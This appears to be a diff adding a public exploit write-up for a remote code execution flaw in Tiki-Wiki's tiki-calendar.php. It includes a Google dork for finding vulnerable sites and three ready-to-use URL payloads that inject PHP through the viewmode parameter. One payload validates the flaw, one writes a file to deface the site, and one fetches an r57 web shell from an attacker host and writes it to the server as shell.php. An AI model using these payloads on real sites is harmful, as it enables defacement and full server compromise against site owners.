@@ -1,0 +1,26 @@
+# Exploit Title: Tiki-Calendar-RCE
+# Google Dork: inurl:tiki-calendar.php
+# Date: 2015-12-16
+# Exploit Author: Dany Ouellet
+# Vendor Homepage: https://tiki.org/article414-Important-Security-Fix-for-all-versions-of-Tiki
+# Software Link: https://tiki.org/Download
+# Version: ALL supported versions of Tiki (14.2, 12.5 LTS, 9.11 LTS and 6.15)(if not patched)
+# Tested on: Windows and Linux
+
+Hi, I recently discover an important flaw in CMS Tiki-Wiki. I reported the
+vulnerability directly to vendor and a patch is now avalaible. So I release
+the exploit. ;)
+
+PoC:
+
+Validate the vulnerability:
+
+http://victimesite/tiki-calendar.php?viewmode=';print(TikiWikiRCE);$a='
+
+Write or deface the site:
+
+http://victimesite/tiki-calendar.php?viewmode=%27;%20$z=fopen(%22index6.php%22,%27w%27);%20fwrite($z,(%22TikiWikiRCE%22));fclose($z);$a=%27
+
+Execute a php shellcode:
+
+http://victimesite/tiki-calendar.php?viewmode=%27;%20$z=fopen%28%22shell.php%22,%27w%27%29;fwrite%28$z,file_get_contents%28%22http://hackersite.com/r57.txt%22%29%29;fclose%28$z%29;%27
